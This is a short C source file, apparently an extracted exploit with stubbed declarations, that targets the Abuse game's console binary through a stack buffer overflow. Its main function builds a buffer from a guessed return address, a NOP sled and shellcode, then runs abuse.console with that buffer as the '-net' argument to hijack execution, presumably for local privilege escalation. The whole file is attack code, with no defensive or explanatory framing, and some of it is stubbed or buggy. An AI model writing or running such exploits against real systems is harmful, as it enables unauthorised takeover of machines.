
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int LEN ;
 char NOP ;
 long RET ;
 long atoi (char*) ;
 long esp () ;
 int memcpy (char*,int ,int) ;
 int printf (char*,...) ;
 int puts (char*) ;
 int shellcode ;
 int sprintf (char*,char*,char*) ;
 int strlen (int ) ;
 int system (char*) ;

void main(int argc,char *argv[])
{

 char cmd[1000];
 int i,x;
 long retn;
 char buff[LEN];


 printf("\nUsage :- %s <offset>\n..",argv[0]);

 if(argc>1)
  retn=esp()-atoi(argv[1]);
 else
  retn=RET;

 printf("Using return Adress :- ",retn );

 for(i=0;i<LEN;i+=4)
 {
  *(long*)&buff[i]=retn;
 }

 for(i=0;i<(LEN-(strlen(shellcode)+8));i++)
 {
  *(buff+i)=NOP;

 }

 memcpy(buff+i,shellcode,strlen(shellcode));

 sprintf(cmd,"/usr/lib/games/abuse/abuse.console -net %s",buff);

 puts("executing .......");

 system(cmd);

 return;
}
